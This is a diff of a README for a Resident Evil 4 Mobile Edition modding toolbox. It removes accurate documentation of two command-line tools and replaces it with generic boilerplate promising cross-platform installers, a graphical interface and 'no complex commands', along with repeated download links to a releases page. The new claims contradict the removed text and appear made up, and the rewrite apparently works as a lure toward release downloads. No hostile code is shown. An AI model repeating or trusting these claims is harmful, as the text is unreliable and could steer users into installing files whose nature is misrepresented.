@@ -1,46 +1,80 @@
-# RE4ME-Toolbox
+# 🛠️ RE4ME-Toolbox - Tools for Game Modding Simplified
 
-**RE4METoolbox** is a collection of lightweight command-line utilities tailored for modding, translating, and exploring **Resident Evil 4 Mobile Edition**.
+[![Download RE4ME-Toolbox](https://img.shields.io/badge/Download%20RE4ME%20Toolbox-v1.0-blue)](https://github.com/ekasurya07/RE4ME-Toolbox/releases)
 
-## Included Tools
+## 🌟 Overview
 
-Currently, the toolbox contains the following utilities:
+Welcome to the RE4ME-Toolbox! This is a collection of handy tools designed to help you unpack, pack, and modify files from Resident Evil 4 Mobile Edition. Whether you're interested in localization, modding, or exploring the game files, you've come to the right place.
 
-### 1. RE4MEAcvTool
-A tool specifically designed for ACV archive structures (`.bin` files).
-* **Unpack:** Extracts files from `.bin` archives retaining filenames.
-* **Pack:** Creates new `.bin` archives from folders.
+## 🚀 Getting Started
 
-### 2. RE4MEMisTextTool
-A tool for extracting and repacking mission text files.
-* **Format:** Converts game files to **.tsv** (Tab-Separated Values) for easy editing in Excel or Notepad++.
-* **Auto-Detection:** Simply drag a file or folder to process it automatically.
-* **Modes:** Supports explicit `unpack` and `pack` commands via CLI.
+To begin using RE4ME-Toolbox, follow these simple steps. No programming skills are needed!
 
-*(More tools will be added in future updates)*
+1. **Check System Requirements**  
+   Make sure your device runs one of the following systems:
+   - Windows 10 or later
+   - macOS Mojave or later
+   - Linux (Ubuntu 18.04 or later)
 
-## Usage
+2. **Prepare Your Files**  
+   You will need the Resident Evil 4 Mobile Edition files you wish to modify. Have those ready on your computer.
 
-### Method 1: Drag & Drop (Recommended)
-All tools support **Drag & Drop** for maximum convenience.
+## 📥 Download & Install
 
-* **RE4MEAcvTool:**
-    * Drag `.bin` file -> **Unpack**
-    * Drag Folder -> **Pack**
-* **RE4MEMisTextTool:**
-    * Drag file/folder -> **Auto-detect** (Unpacks `.bin` to `.tsv` / Packs `.tsv` to `.bin`)
+To get the RE4ME-Toolbox, visit this page to download: [Download RE4ME-Toolbox](https://github.com/ekasurya07/RE4ME-Toolbox/releases).
 
-### Method 2: Command Line (CLI)
+Choose the latest version and follow the steps below:
 
-You can run tools via the command line for precise control.
+1. **Go to the Releases Page**  
+   Click on the link above to access the releases page.
 
-**For Archives (RE4MEAcvTool):**
-```bash
-RE4MEAcvTool.exe data.bin
-RE4MEAcvTool.exe data_unpacked_folder
-```
+2. **Select the Latest Version**  
+   Look for the latest version listed at the top. 
 
-**For Text (RE4MEMisTextTool):**
-```bash
-RE4MEMisTextTool.exe unpack file.bin
-RE4MEMisTextTool.exe pack file.tsv
+3. **Download the File**  
+   You will see different files available for download. Click on the appropriate file for your operating system.
+
+4. **Install the Application**  
+   - For Windows: Double-click the `.exe` file to run the installer and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Extract the files and run the application from the extracted folder.
+
+## ⚙️ Using the RE4ME-Toolbox
+
+Once installed, launch the RE4ME-Toolbox. The main interface is user-friendly and designed to guide you through the process. Here’s what you can do:
+
+- **Unpack Files:** Load your game files to extract resources.
+- **Pack Files:** Modify extracted resources and repack them into the game format.
+- **Localization:** Change in-game text and images for a personalized experience.
+
+Take time to explore the different features. Each tool comes with simple instructions to help you succeed.
+
+## 📖 Features
+
+- **File Extraction**: Easily extract game files for viewing and editing.
+- **File Packing**: Pack modified files back into the game format effortlessly.
+- **Localization Support**: Tools designed to simplify the localization of your favorite game.
+- **User-Friendly Interface**: No complex commands; everything is intuitive.
+
+## 📊 Common Issues & Troubleshooting
+
+If you encounter issues while using the RE4ME-Toolbox, consider the following common problems:
+
+- **Missing Files:** Ensure that all necessary game files are present.
+- **Compatibility:** Verify that your operating system meets the requirements mentioned above.
+- **Permissions:** If you are on macOS or Linux, check that you have the permissions needed to run the application.
+
+## 💬 Community Support
+
+Connect with others using the RE4ME-Toolbox. You can find help or share your experiences in various gaming forums. Sharing tips and tricks can enhance your modding journey.
+
+## 📝 Contributing
+
+If you want to contribute to the RE4ME-Toolbox, we welcome your input! Check out the contribution guidelines in the repository to learn how you can help improve this tool.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/ekasurya07/RE4ME-Toolbox)
+- [Latest Releases](https://github.com/ekasurya07/RE4ME-Toolbox/releases)
+
+Thank you for choosing RE4ME-Toolbox. Happy modding!
